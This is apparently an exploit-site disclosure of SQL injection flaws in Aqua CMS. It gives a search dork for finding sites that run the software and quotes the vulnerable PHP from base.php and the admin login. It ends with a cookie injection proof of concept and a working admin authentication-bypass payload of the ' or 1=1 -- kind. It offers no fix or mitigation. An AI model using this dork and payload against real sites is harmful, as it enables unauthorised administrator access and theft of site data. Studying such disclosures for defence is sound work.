Aqua CMS (username) SQL Injection Vulnerability
===============================================


================================================================================

Found : halkfild
Dork : "Powered By Aqua Cms"
Vendor: http://www.aquacms.net

================================================================================

  SQL-injections:
  Need: magic quotes = off


 vuln file: /droplets/functions/base.php
 vuln code:

65:// Check the status of the orders

if(isset($_COOKIE["userSID"])) {
$sqltable = $sitename."_orders";
$selck = $_COOKIE["userSID"];
mysql_select_db($database, $dbconnect);
$query_cartcheck = "SELECT SID FROM $sqltable WHERE SID = &#039;$selck&#039; AND status = 1";  
$cartcheck = mysql_query($query_cartcheck, $dbconnect) or die(mysql_error());
$row_cartcheck = mysql_fetch_assoc($cartcheck);
$totalRows_cartcheck = mysql_num_rows($cartcheck);

if ($totalRows_cartcheck != 0) {
 $user_ip_address = $_SERVER[&#039;REMOTE_ADDR&#039;];
 $dt=date("YmdHis"); 
 $UID="$dt$user_ip_address";
 setcookie("userSID", $UID, time()+36000);
}

}


PoC: COOKIE: userSID=&#039;[foo]


-----------------------------------------------------------------------------------


  Auth bypass
  Need: magic quotes = off

 vuln file: /admin/index.php
 vuln code:

10:
if (isset($_POST[&#039;username&#039;]) == TRUE) {
 $uusername = $_POST[&#039;username&#039;];
 $upassword = $_POST[&#039;password&#039;];
 $sqltable = $sitename."_users";
 mysql_select_db($database, $dbconnect);
 $query_getuser = "
 SELECT * 
 FROM $sqltable 
 WHERE username = &#039;$uusername&#039; 
 AND password = &#039;$upassword&#039; 
 AND groups != &#039;&#039; 
 ";
 $getuser = mysql_query($query_getuser, $dbconnect) or die("Unable to select database");
 $row_getuser = mysql_fetch_assoc($getuser);
 $totalRows_getuser = mysql_num_rows($getuser);
 
 if ($totalRows_getuser == 1) {
  $uid = $row_getuser[&#039;id&#039;];
  $uun = $row_getuser[&#039;username&#039;];
  $ugr = $row_getuser[&#039;groups&#039;];
  $setwsuser = $uid.":".$uun.":".$ugr; 
  //setcookie("wsuser", $setwsuser, time()+36000, &#039;/&#039;);
  //header("Location: index.php");
 } 
 
// User logon: end
}


PoC: POST: username=&#039;[foo]
Exploit: POST: username=crackfor.me&#039;+or+1=1+limit+1+--+ 



